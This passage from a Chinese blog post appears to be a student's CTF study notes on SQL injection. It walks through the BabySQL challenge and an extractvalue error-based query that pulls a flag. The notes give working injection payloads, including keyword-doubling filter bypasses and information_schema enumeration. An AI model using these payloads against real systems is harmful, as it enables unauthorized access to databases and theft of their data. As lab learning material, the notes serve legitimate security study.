+<p>而是 SELECT 的一列他的行数大于 1,也就是 WHERE 没能把他限定在一行,用 GROUP_CONCAT 就能解决</p>
+<p>直接来到最后一步</p>
+<p>payload:</p>
+<p>?id&#x3D;1” AND 1&#x3D;extractvalue(2,CONCAT(‘~’,(SUBSTR((SELECT GROUP_CONCAT(FLAG) FROM flag),16,30)))) –+</p>
+<p>这样 flag 就能被正常显示了,还需要用 substr 调整一下</p>
+<p>说白了就是用 group_concat 包裹一下列名,注意不要把 from 和 where 给包裹进去了</p>
+<p><img src="/images/XMWcbhBVjojRjgxK6qQcx09mn7e.png"></p>
+<h3 id="做题启示-1"><a href="#做题启示-1" class="headerlink" title="做题启示"></a>做题启示</h3><p>group_concat 可以解决只能输出一行的问题.</p>
+<h2 id="极客大挑战-2019-BabySQL1"><a href="#极客大挑战-2019-BabySQL1" class="headerlink" title="[极客大挑战 2019]BabySQL1"></a>[极客大挑战 2019]BabySQL1</h2><p>来到题目,该网站存在严格过滤,是个 SQL 注入的过滤版题型</p>
+<p><img src="/images/YfAdb3J8YoEE01xXdmQcHKRhn3d.png"></p>
+<p>用户名和密码应该分别对应两个变量的值,我们输入用户名和密码试试看</p>
+<p><img src="/images/HVRgbkdRYo15JLxs67wcdQYnnyd.png"></p>
+<p>进不去，提示用户名和密码错误</p>
+<p><img src="/images/IuFcbQMmVoSOkuxq2DFcjtkOn6H.png"></p>
+<p>那试试看错误的语法他会怎么提示,并看看闭合方式.</p>
+<p><img src="/images/T0iQbxRDUo5KkZx4d8mcP1YNnhd.png"></p>
+<p>这么报错,发现是单引号闭合方式</p>
+<p><img src="/images/KHnubCYyZoMLaSxbLOVcQB2XnRe.png"></p>
+<p>我们现在任何回显都没得到,先按照做题顺序来,看看怎样才能让他回显</p>
+<p><img src="/images/NmFibyQutoypA2x34nEcqr3UnId.png"></p>
+<p><img src="/images/PoKkbogq6oQYWMxFDmjc8j8fnXf.png"></p>
+<p>UNION SELECT 加号都不见了,推知全被过滤了,前两个用双写,注释用手动闭合绕过吧</p>
+<p>Payload:密码&#x3D;1’ UNIUNIONON SELSELECTECT 1 AND 1&#x3D;’1</p>
+<p><img src="/images/EMOUbWApeoNq7rxOea4cw36qnSg.png"></p>
+<p>前面都没报错,就这里报错了,可能 AND 也被绕过了,试试另一个绕过注释符的方式</p>
+<p>Payload:密码&#x3D;1’ UNIUNIONON SELSELECTECT 1**’** (在修改密码的同时始终保证用户名是 1)</p>
+<p>用红色单引号手动闭合一下</p>
+<p><img src="/images/FvPfbQxfOomHNdxZzscc4Zh7nQb.png"></p>
+<p>运行通过了,列数不对,用 SELECT1,2 SELECT1,2,3 都试试,发现 SELECT1,2,3 竟然登陆成功了,且回显位是 2 和 3!!</p>
+<p><img src="/images/AGBtbookSofXbdxvPKecVQf9nAp.png"></p>
+<p>2 改成 DATABASE()再看看</p>
+<p><img src="/images/GyV4bKc9SofVQ1xVW8XcpNnZnXb.png"></p>
+<p>好的,正常运行.</p>
+<p>那步骤也正常进行:Payload:</p>
+<p>密码&#x3D;1’ UNIUNIONON SELSELECTECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFORMATION_SCHEMA.tables**’**</p>
+<p><img src="/images/TTiEbBQlSoTi14x6G4bcLOEMnpe.png"></p>
+<p>information_schema 全没了,过滤了 and,估计也过滤了 or,用复写形式重试.</p>
+<p>payload:</p>
+<p>密码&#x3D;1’ UNIUNIONON SELSELECTECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFOORRMATION_SCHEMA.tables**’**</p>
+<p><img src="/images/ND7Mbrt2Ao1rMaxWGTRcidoQnAc.png"></p>
+<p>还是进不去,估计整个单词都没了,复写一整个单词</p>
+<p>密码&#x3D;1’ UNIUNIONON SELSELECTECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFOORRMATION_SCHINFORMATION_SCHEMAEMA.tables**’**</p>
+<p>还是不行,那一个一个试呗,只知道 tables 前面显示不出…</p>
+<p>……</p>
+<p>死活进不去,到网上搜了下攻略,改了一下代码,发现只有这条才能进 database()的表名</p>
+<p>不写 where table_schema&#x2F;写 table_schema&#x3D;database()都报错</p>
+<p>密码&#x3D;1’ UNIUNIONON SELSELECTECT 1,GROUP_CONCAT(TABLE_NAME),3 FRFROMOM INFOORRMATION_SCHEMA.tables whwhereere table_schema&#x3D;’geek’<strong>‘</strong></p>
+<p>这样 geek 中的表名就全显示出来了</p>
+<p><img src="/images/Mv20bYqFIoT27YxXhDdcqpHgnud.png"></p>
+<p>查这两个表,依然没看到 flag,于是查看一下所有的数据库名,看看 flag 在哪个数据库</p>
+<p>1’ ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata</p>
+<p>回显了一个名为 ctf 的数据库,再次查询这个数据库,作重复步骤,就得到了 flag 了</p>
+<p><em>(这个靶场不知道是有问题还是咋,后面也一直不给回显(我是正确按照攻略的 payload 操作的),一开始的’’不写 where table_schema&#x2F;写 table_schema&#x3D;database()都报错’’也不知道是靶场错误还是真的过滤了什么东西,总之最后没做出来…)</em></p>
+<h3 id="做题启示-2"><a href="#做题启示-2" class="headerlink" title="做题启示"></a>做题启示</h3><p>1.输用户名和密码的题目,尽量在密码里面注入,不要在用户名,因为后面还有一个密码会造成一些问题</p>
+<p>其他的题目也尽量在最后一个数据注入(一开始对用户名进行 SQL 注入,死活说我 password 有问题…).</p>
+<p>2.查数据库:select 1,2,group_concat(schema_name) from information_schema.schemata</p>
+<p>3.一开始回显不了也莫慌张,没准 UNION SELECT 1,2,3 就回显了</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/11/04/%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="prev" title="第三章 文件包含">
+      <i class="fa fa-chevron-left"></i> 第三章 文件包含
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2026/01/12/%E6%9C%9F%E6%9C%AB%E7%AA%81%E5%87%BB-%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AF%BC%E8%AE%BA/" rel="next" title="期末突击-人工智能导论">
+      期末突击-人工智能导论 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E7%AB%A0-SQL-%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">第四章 SQL 注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Week4-1-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E4%B8%8E-SQL-%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="nav-number">2.</span> <span class="nav-text">[Week4.1]数据库基础与 SQL 基本语法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80"><span class="nav-number">2.1.</span> <span class="nav-text">数据库基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DBMS-%E7%9A%84%E7%BB%84%E6%88%90%E7%A8%8B%E5%BA%8F"><span class="nav-number">2.1.1.</span> <span class="nav-text">DBMS 的组成程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DBMS-%E7%9A%84%E5%8A%9F%E8%83%BD"><span class="nav-number">2.1.2.</span> <span class="nav-text">DBMS 的功能</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DBMS-%E7%9A%84%E7%89%B9%E7%82%B9"><span class="nav-number">2.1.3.</span> <span class="nav-text">DBMS 的特点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8"><span class="nav-number">2.2.</span> <span class="nav-text">数据库表</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%97%EF%BC%88%E5%AD%97%E6%AE%B5%EF%BC%89-%E8%A1%A8%E6%A0%BC%E7%9A%84-%E2%80%9C%E8%A1%A8%E5%A4%B4%E2%80%9D"><span class="nav-number">2.2.1.</span> <span class="nav-text">列（字段）&#x3D; 表格的 “表头”</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A1%8C%EF%BC%88%E8%AE%B0%E5%BD%95%EF%BC%89-%E8%A1%A8%E6%A0%BC%E9%87%8C%E7%9A%84-%E2%80%9C%E6%AF%8F%E4%B8%80%E8%A1%8C%E6%95%B0%E6%8D%AE%E2%80%9D"><span class="nav-number">2.2.2.</span> <span class="nav-text">行（记录）&#x3D; 表格里的 “每一行数据”</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BA%A6%E6%9D%9F-%E7%BB%99%E8%A1%A8%E6%A0%BC%E5%AE%9A%E7%9A%84-%E2%80%9C%E8%A7%84%E7%9F%A9%E2%80%9D"><span class="nav-number">2.2.3.</span> <span class="nav-text">约束 &#x3D; 给表格定的 “规矩”</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B4%A2%E5%BC%95-%E8%A1%A8%E6%A0%BC%E7%9A%84-%E2%80%9C%E7%9B%AE%E5%BD%95%E2%80%9D"><span class="nav-number">2.2.4.</span> <span class="nav-text">索引 &#x3D; 表格的 “目录”</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%83%E6%95%B0%E6%8D%AE-%E8%A1%A8%E6%A0%BC%E7%9A%84-%E2%80%9C%E5%A4%87%E6%B3%A8%E2%80%9D"><span class="nav-number">2.2.5.</span> <span class="nav-text">元数据 &#x3D; 表格的 “备注”</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%9A%84%E4%B8%80%E8%88%AC%E8%A6%81%E6%B1%82"><span class="nav-number">2.2.6.</span> <span class="nav-text">数据的一般要求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%9A%84%E9%80%89%E5%AE%9A"><span class="nav-number">2.2.7.</span> <span class="nav-text">数据的选定</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="nav-number">2.3.</span> <span class="nav-text">SQL 基本语法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A6%82%E8%AE%BA"><span class="nav-number">2.3.1.</span> <span class="nav-text">概论</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%9A%84%E5%A4%84%E7%90%86-%E6%9F%A5%E8%AF%A2-%E4%BF%AE%E6%94%B9-%E6%8F%92%E5%85%A5-%E5%92%8C%E5%88%A0%E9%99%A4"><span class="nav-number">2.3.2.</span> <span class="nav-text">数据的处理(查询 修改(插入)和删除)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SELECT"><span class="nav-number">2.3.2.1.</span> <span class="nav-text">SELECT</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#INSERT-INTO"><span class="nav-number">2.3.2.2.</span> <span class="nav-text">INSERT INTO</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UPDATE"><span class="nav-number">2.3.2.3.</span> <span class="nav-text">UPDATE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DELETE"><span class="nav-number">2.3.2.4.</span> <span class="nav-text">DELETE</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E7%9A%84%E5%A4%84%E7%90%86-%E5%88%9B%E5%BB%BA-%E4%BF%AE%E6%94%B9%E5%92%8C%E5%88%A0%E9%99%A4"><span class="nav-number">2.3.3.</span> <span class="nav-text">数据库表的处理(创建 修改和删除)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CREATE-TABLE"><span class="nav-number">2.3.3.1.</span> <span class="nav-text">CREATE TABLE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ALTER-TABLE"><span class="nav-number">2.3.3.2.</span> <span class="nav-text">ALTER TABLE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DROP-TABLE"><span class="nav-number">2.3.3.3.</span> <span class="nav-text">DROP TABLE</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B4%A2%E5%BC%95%E7%9A%84%E6%93%8D%E4%BD%9C"><span class="nav-number">2.3.4.</span> <span class="nav-text">索引的操作</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CREATE-INDEX"><span class="nav-number">2.3.4.1.</span> <span class="nav-text">CREATE INDEX</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DROP-INDEX"><span class="nav-number">2.3.4.2.</span> <span class="nav-text">DROP INDEX</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E6%8C%87%E4%BB%A4"><span class="nav-number">2.3.5.</span> <span class="nav-text">其他指令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#WHERE"><span class="nav-number">2.3.5.1.</span> <span class="nav-text">WHERE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ORDER-BY"><span class="nav-number">2.3.5.2.</span> <span class="nav-text">ORDER BY</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GROUP-BY"><span class="nav-number">2.3.5.3.</span> <span class="nav-text">GROUP BY</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#HAVING"><span class="nav-number">2.3.5.4.</span> <span class="nav-text">HAVING</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JOIN"><span class="nav-number">2.3.5.5.</span> <span class="nav-text">JOIN</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DISTINCT"><span class="nav-number">2.3.5.6.</span> <span class="nav-text">DISTINCT</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#LIMIT"><span class="nav-number">2.3.5.7.</span> <span class="nav-text">*LIMIT</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UNION"><span class="nav-number">2.3.5.8.</span> <span class="nav-text">*UNION</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A"><span class="nav-number">2.3.6.</span> <span class="nav-text">*注释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="nav-number">2.3.7.</span> <span class="nav-text">*常用参数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Week4-2-SQL-%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">[Week4.2]SQL 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A6%82%E8%AE%BA-1"><span class="nav-number">3.1.</span> <span class="nav-text">概论</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%AB%E4%B9%89"><span class="nav-number">3.1.1.</span> <span class="nav-text">含义</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="nav-number">3.1.2.</span> <span class="nav-text">核心原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%A4%BA%E4%BE%8B"><span class="nav-number">3.1.3.</span> <span class="nav-text">简单示例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E5%8D%B1%E5%AE%B3"><span class="nav-number">3.1.4.</span> <span class="nav-text">常见危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SELECT-%E5%87%BD%E6%95%B0%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86"><span class="nav-number">3.1.5.</span> <span class="nav-text">SELECT 函数预备知识</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="nav-number">3.2.</span> <span class="nav-text">基础注入类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%95%B0%E5%AD%97%E5%9E%8B-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">3.2.1.</span> <span class="nav-text">判断数字型&#x2F;字符型注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E4%BD%BF%E7%94%A8-and-1-1-and-1-2-%E8%BF%9B%E8%A1%8C%E5%88%A4%E6%96%AD"><span class="nav-number">3.2.1.1.</span> <span class="nav-text">方法一 使用 and 1&#x3D;1&#x2F;and 1&#x3D;2 进行判断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-%E4%BD%BF%E7%94%A8%E5%B8%A6%E5%87%8F%E5%8F%B7%E7%9A%84%E8%BF%90%E7%AE%97%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%BF%9B%E8%A1%8C%E5%88%A4%E6%96%AD"><span class="nav-number">3.2.1.2.</span> <span class="nav-text">方法二 使用带减号的运算表达式进行判断</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="nav-number">3.2.2.</span> <span class="nav-text">判断闭合方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E6%98%AF%E5%90%A6%E6%8A%A5%E9%94%99"><span class="nav-number">3.2.2.1.</span> <span class="nav-text">通过是否报错</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF"><span class="nav-number">3.2.2.2.</span> <span class="nav-text">通过报错信息</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E5%9B%9E%E6%98%BE%E4%BD%8D-%E8%A7%81-SQLi-Labs-1-%E8%A7%A3%E9%A2%98"><span class="nav-number">3.2.3.</span> <span class="nav-text">寻找回显位(见 SQLi-Labs-1 解题)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B-UNION-%E6%B3%A8%E5%85%A5"><span class="nav-number">3.3.</span> <span class="nav-text">字符型 UNION 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%BF%E5%88%B0%E8%A1%A8%E5%90%8D%E5%92%8C%E5%88%97%E5%90%8D"><span class="nav-number">3.3.1.</span> <span class="nav-text">拿到表名和列名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E5%9B%9E%E6%98%BE%E4%BD%8D%E5%8F%AA%E8%83%BD%E6%98%BE%E7%A4%BA%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">3.3.2.</span> <span class="nav-text">解决回显位只能显示一个数据的问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%9C%80%E7%BB%88%E7%9B%AE%E6%A0%87"><span class="nav-number">3.3.3.</span> <span class="nav-text">查询最终目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLi-Labs-1-%E8%A7%A3%E9%A2%98%E7%A4%BA%E4%BE%8B"><span class="nav-number">3.3.4.</span> <span class="nav-text">SQLi-Labs-1 解题示例</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%9F%A5%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">3.3.4.1.</span> <span class="nav-text">1.查找注入点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B-%E5%AD%97%E7%AC%A6%E5%9E%8B-%E6%95%B0%E5%AD%97%E5%9E%8B"><span class="nav-number">3.3.4.2.</span> <span class="nav-text">2.判断注入类型(字符型&#x2F;数字型)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E6%89%BE%E5%88%B0%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="nav-number">3.3.4.3.</span> <span class="nav-text">3.找到闭合方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E5%88%A4%E6%96%AD%E6%9F%A5%E8%AF%A2%E5%88%97%E6%95%B0"><span class="nav-number">3.3.4.4.</span> <span class="nav-text">4.判断查询列数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-%E6%89%BE%E5%88%B0%E5%9B%9E%E6%98%BE%E4%BD%8D"><span class="nav-number">3.3.4.5.</span> <span class="nav-text">5.找到回显位</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-%E6%9F%A5%E8%AF%A2%E8%A1%A8%E5%90%8D%E5%92%8C%E5%88%97%E5%90%8D"><span class="nav-number">3.3.4.6.</span> <span class="nav-text">6.查询表名和列名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-%E5%BE%97%E5%88%B0%E7%AD%94%E6%A1%88"><span class="nav-number">3.3.4.7.</span> <span class="nav-text">7.得到答案</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B-UNION-%E6%B3%A8%E5%85%A5"><span class="nav-number">3.4.</span> <span class="nav-text">数字型 UNION 注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">3.5.</span> <span class="nav-text">布尔盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0"><span class="nav-number">3.5.1.</span> <span class="nav-text">关键函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%8E%9F%E7%90%86"><span class="nav-number">3.5.2.</span> <span class="nav-text">布尔盲注原理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">3.6.</span> <span class="nav-text">时间盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0-1"><span class="nav-number">3.6.1.</span> <span class="nav-text">关键函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E5%8E%9F%E7%90%86"><span class="nav-number">3.6.2.</span> <span class="nav-text">时间盲注原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E%E7%9B%B2%E6%B3%A8%E7%9A%84%E8%A1%A5%E5%85%85%E5%87%BD%E6%95%B0"><span class="nav-number">3.6.3.</span> <span class="nav-text">关于盲注的补充函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#length"><span class="nav-number">3.6.3.1.</span> <span class="nav-text">length()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SUBSTR"><span class="nav-number">3.6.3.2.</span> <span class="nav-text">SUBSTR()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MID"><span class="nav-number">3.6.3.3.</span> <span class="nav-text">MID()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CONCAT"><span class="nav-number">3.6.3.4.</span> <span class="nav-text">CONCAT()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">3.7.</span> <span class="nav-text">堆叠注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">3.8.</span> <span class="nav-text">报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#extractvalue-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">3.8.1.</span> <span class="nav-text">extractvalue 报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E6%8A%A5%E9%94%99%E5%8F%AA%E8%83%BD%E6%98%BE%E7%A4%BA-32-%E5%AD%97%E7%AC%A6%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">3.8.2.</span> <span class="nav-text">解决报错只能显示 32 字符的问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLi-Labs-5-%E8%A7%A3%E9%A2%98%E7%A4%BA%E4%BE%8B"><span class="nav-number">3.8.3.</span> <span class="nav-text">SQLi-Labs-5 解题示例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#updatexml-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">3.8.4.</span> <span class="nav-text">updatexml 报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#floor-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">3.8.5.</span> <span class="nav-text">floor 报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B6%89%E5%8F%8A%E5%88%B0%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-number">3.8.5.1.</span> <span class="nav-text">涉及到的函数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#FROM-%E6%8E%A5%E7%AE%A1%E9%97%AE%E9%A2%98"><span class="nav-number">3.8.5.1.1.</span> <span class="nav-text">*FROM 接管问题</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%A7%8D%E5%AD%90"><span class="nav-number">3.8.5.2.</span> <span class="nav-text">随机数种子</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E8%AF%AD%E5%8F%A5"><span class="nav-number">3.8.5.3.</span> <span class="nav-text">核心语句</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GROUP-CONCAT-%E9%97%AE%E9%A2%98"><span class="nav-number">3.8.5.4.</span> <span class="nav-text">GROUP_CONCAT()问题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQLi-Labs-2-%E8%A7%A3%E9%A2%98%E7%A4%BA%E4%BE%8B"><span class="nav-number">3.8.6.</span> <span class="nav-text">SQLi-Labs-2 解题示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%83%A8%E5%88%86%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">3.9.</span> <span class="nav-text">部分过滤绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="nav-number">3.9.1.</span> <span class="nav-text">注释符号过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#And-%E5%92%8C-Or-%E8%BF%87%E6%BB%A4"><span class="nav-number">3.9.2.</span> <span class="nav-text">And 和 Or 过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="nav-number">3.9.3.</span> <span class="nav-text">空格过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SELECT-%E5%92%8C-UNION-%E8%BF%87%E6%BB%A4"><span class="nav-number">3.9.4.</span> <span class="nav-text">SELECT 和 UNION 过滤</span></a></li><li class="nav-item 